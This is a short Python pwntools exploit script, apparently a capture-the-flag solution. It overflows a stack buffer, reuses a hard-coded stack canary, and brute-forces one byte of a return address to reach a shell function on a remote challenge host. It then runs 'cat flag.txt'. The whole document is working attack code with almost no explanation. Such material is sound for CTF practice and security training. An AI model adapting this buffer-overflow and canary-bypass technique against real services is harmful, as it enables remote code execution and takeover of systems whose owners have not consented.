from pwn import *

# stack canary
canary =b'\x00\x14:\x822\x8a\xe3\x88'

# create payload that will fill buffer and place the canary
# canary is sent twice because of the 8byte distance between canary and plsgivemeshell address
payload = b"A" * 72 + canary + canary
for byte in range(1,255):
    final_address = b'\x40' + byte.to_bytes(1, "big")
    #print(final_address)

    conn = remote('vuln.redrocket.club', 2288)

    new_payload = payload + final_address
    # print(new_payload)

    # "Connected!"
    output = conn.recvline()
    # print(output)
    conn.send(new_payload)


    conn.readuntil("bytes")

    conn.sendline("cat flag.txt")
    print(hex(byte))
    print(conn.clean())